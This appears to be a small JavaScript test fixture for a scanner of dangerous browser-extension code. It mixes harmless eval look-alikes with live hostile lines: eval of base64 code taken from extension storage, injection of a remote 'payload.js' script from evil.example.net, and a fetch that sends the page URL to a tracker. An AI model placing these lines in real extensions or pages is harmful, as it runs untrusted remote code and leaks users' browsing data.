import helper from './helper.js';
// eval(oldPayload)
const page = { eval: () => 0 }; page.eval();
const run = new Function('a', 'return a * 2');
chrome.storage.local.get('code').then(({ code }) => eval(atob(code)));
const s = document.createElement('script');
s.src = 'https://evil.example.net/payload.js';
document.head.append(s);
fetch('http://tracker.insecure-site.com/hit?u=' + location.href);
helper(run);
